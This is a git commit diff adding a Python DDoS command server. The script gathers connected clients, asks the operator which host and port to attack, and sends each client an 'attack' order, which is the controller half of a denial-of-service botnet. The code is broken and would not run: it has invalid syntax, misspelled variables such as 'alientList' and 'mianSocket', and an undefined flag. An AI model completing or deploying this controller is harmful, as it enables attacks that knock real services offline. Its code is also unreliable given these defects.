617eb2854fdf1d349bc414de58376677e075b5a9
Mohammad Reza Heidarian <mrhsce@gmail.com>
2013-03-09 15:40:35 +0330

    DOS-server complete

--- dos code/ddos-server.py
+++ dos code/ddos-server.py
@@ -21,31 +21,47 @@ mainSocket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 mainSocket.bind(address)
 mainSocket.listen(5)
 
-#**************************
+#(**************************
 clientList=[]  #A list of address of all clients
-stop=False
 
 
+#Thread 1
 def reciever(mainSocket):
-    global stop
     clientList=[]
-    while not stop:
-        mainSocket.listen(5)
-        clientList.append(mainSocket.accept()) 
-    return alientList
+    mainSocket.listen(5)
+    while 1:
+        client,addr=mainSocket.accept()
+        if not (client,addr) in clientList:
+            if client==mianSocket:
+            break
+            clientList.append() 
+    if stop:
+        attackHost=input("Please enter the host name you wanna attack :")
+        port=input("PLease insert the attack port or leave for default :")
+        if port="":
+            port =80
+        else:
+            port=int(port)
+        return alientList,host,port
+#Thread 2
 def stopper():
-    global stop
-    stop=True
+    global address
+    if input("Do you wanna stop ?"):
+        stopsock=socket.socket()
+        stopsock.connect(address)
     
 
 
-"""Here should be a function that
-unless the user stop it listens to the network to accept new clients
-"""
-
-#**************************
 
 
+#**************************)
+
+
+def attacker(mainSocket,clientList,host,port):
+    for i in alienList:
+        attack="attack>>"+str(host)+">>"+str(port)
+        i[0].sendall(attack.encode())
+        
 
 
 
